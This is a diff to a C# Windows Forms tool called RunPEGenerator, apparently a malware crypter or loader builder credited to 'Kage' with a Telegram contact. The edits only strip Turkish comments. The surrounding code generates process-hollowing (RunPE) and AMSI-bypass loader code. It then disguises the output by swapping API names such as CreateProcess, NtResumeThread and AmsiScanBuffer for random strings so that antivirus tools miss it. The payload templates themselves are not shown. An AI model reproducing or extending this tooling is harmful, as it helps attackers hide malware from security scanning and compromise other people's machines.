@@ -24,7 +24,7 @@ namespace RunPEGenerator
             InitializeComponent();
         }
 
-        // Kod üretme butonuna tıklama işlemi
+
         private void Form1_Load(object sender, EventArgs e)
         {
             MessageBox.Show("Coded By Kage", "Telegram = KageSoftware", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
@@ -33,7 +33,7 @@ namespace RunPEGenerator
 
             string generatedCode = string.Empty;
 
-        // Seçilen RunPE tipi ile uygun kodu üret
+
         private void GenerateButton_Click(object sender, EventArgs e)
         {
             string selectedRunPEType = GetSelectedRunPEType();
@@ -73,10 +73,10 @@ namespace RunPEGenerator
                     return;
             }
 
-            // Kodu obfuscate et
+
             string obfuscatedCode = ObfuscateCode(generatedCode, selectedRunPEType);
 
-            // Kodu ekrana yazdır
+
             OutputTextBox.Text = obfuscatedCode;
         }
 
@@ -101,7 +101,7 @@ namespace RunPEGenerator
             if (Type7RadioButton.Checked)
                 return "AES Şifreleme";
 
-            return string.Empty; // Eğer hiçbir seçim yapılmadıysa
+            return string.Empty; 
         }
 
 
@@ -910,7 +910,7 @@ namespace Offline.Special
 
             string obfuscatedCode = code;
 
-            // RunPE Type 1 için özel obfuscation
+
             if (runPEType == "Type 1")
             {
                 obfuscatedCode = obfuscatedCode.Replace("CreateProcess", GenerateRandomName(999));
@@ -923,7 +923,7 @@ namespace Offline.Special
                 obfuscatedCode = obfuscatedCode.Replace("NtResumeThread", GenerateRandomName(999));
 
             }
-            // RunPE Type 2 için özel obfuscation
+
             else if (runPEType == "AMSI Bypass 2")
             {
                 obfuscatedCode = obfuscatedCode.Replace("InlineAssignHelper", GenerateRandomName(999));
@@ -937,7 +937,7 @@ namespace Offline.Special
                 obfuscatedCode = obfuscatedCode.Replace("AmsiScanBuffer", GenerateRandomName(999));
                 obfuscatedCode = obfuscatedCode.Replace("GetProcAddress", GenerateRandomName(999));
             }
-            // RunPE Type 3 için özel obfuscation
+
             else if (runPEType == "Type 3")
             {
                 obfuscatedCode = obfuscatedCode.Replace("CreateProcess", GenerateRandomName(999));
@@ -1044,7 +1044,7 @@ namespace Offline.Special
 
 
 
-        // Kaydet butonuna tıklama işlemi
+
         private void SaveButton_Click(object sender, EventArgs e)
         {
             SaveFileDialog saveFileDialog = new SaveFileDialog
@@ -1060,7 +1060,7 @@ namespace Offline.Special
             }
         }
 
-        // Temizleme butonuna tıklama işlemi
+
         private void ClearButton_Click(object sender, EventArgs e)
         {
             OutputTextBox.Clear();
@@ -1068,7 +1068,7 @@ namespace Offline.Special
         private void CopyButton_Click(object sender, EventArgs e)
         {
             {
-                // OutputTextBox içindeki metni panoya kopyala
+
                 if (!string.IsNullOrEmpty(OutputTextBox.Text))
                 {
                     Clipboard.SetText(OutputTextBox.Text);
